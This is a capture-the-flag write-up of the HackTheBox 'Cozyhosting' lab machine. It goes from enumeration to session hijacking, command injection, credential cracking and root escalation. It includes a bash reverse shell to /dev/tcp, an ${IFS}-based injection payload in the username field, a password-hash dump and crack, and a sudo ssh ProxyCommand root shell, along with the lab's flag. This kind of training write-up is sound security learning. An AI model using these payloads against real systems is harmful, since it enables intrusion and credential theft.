# Cozyhosting

![Untitled](https://github.com/joaorelva/HackTheBox/assets/45034257/eaa26dac-0646-485f-bb51-ca52183757c9)

## Enumeration

nmap -A -sV -sS cozyhosting.htb

![Untitled 1](https://github.com/joaorelva/HackTheBox/assets/45034257/2bb0b3a0-d996-4098-9424-338eefc70511)

dirsearch -u cozyhosting.htb

![Untitled 2](https://github.com/joaorelva/HackTheBox/assets/45034257/8ed93197-4f12-484e-a74b-bccc40fc988f)

I found the session ids for the users in this link http://cozyhosting.htb/actuator/sessions. So i tried to login with the session id of kanderson in inspetctor and i had success.

![Untitled 3](https://github.com/joaorelva/HackTheBox/assets/45034257/5b22d001-75b4-42d6-a261-1a0f70053ae5)
![Untitled 4](https://github.com/joaorelva/HackTheBox/assets/45034257/5b81cd38-e929-48e1-ae2b-4f3585151225)

## Exploitation

Scrolling to the bottom of the website i saw possible ssh conection. I passed some inputs and captured them on burpsuite.

![Untitled 5](https://github.com/joaorelva/HackTheBox/assets/45034257/005f05c2-51a7-4049-b6fd-327d38b5d538)

It responded to the command, so we will try to reverse shell enconded with base64 because of the special characters.

Payload (base64): echo “`/bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/443 0>&1'`" | base64 -w 0

`username=2>/dev/null;echo${IFS}<base64_encoded_payload>|base64${IFS}-d|/bin/bash;#`

SHELL OWNED.

Now we need the user josh flag. We can see this file: cloudhosting-0.0.1.jar.

I created a local server on the machine to download the file:

`python3 -m http.server 4444`

wget http://10.10.11.230:4445/cloudhosting-0.0.1.jar

jd-gui [cloudhosting-0.0.1.jar](http://10.10.11.230:4445/cloudhosting-0.0.1.jar) to see the file 

![Untitled 6](https://github.com/joaorelva/HackTheBox/assets/45034257/944fcaf5-2eba-49d0-a43a-1205ce36dbd2)

Login in postgres database: psql -h 127.0.0.1 -U postgres

Select * from users;

![Untitled 7](https://github.com/joaorelva/HackTheBox/assets/45034257/9563c2fe-ee62-4062-8d21-e563d05a9fc8)

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

ssh josh@cozyhosting.htb

## Privilege Escalation

sudo -l to see what josh can run as root: (root) /usr/bin/ssh *

There was a simple payload at GTFOBINS which successfully allowed us to get the shell as the superuser(root).

Payload: https://gtfobins.github.io/gtfobins/ssh/#sudo

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x` → FLAG: c70f826511e78055af97293ec35d6420
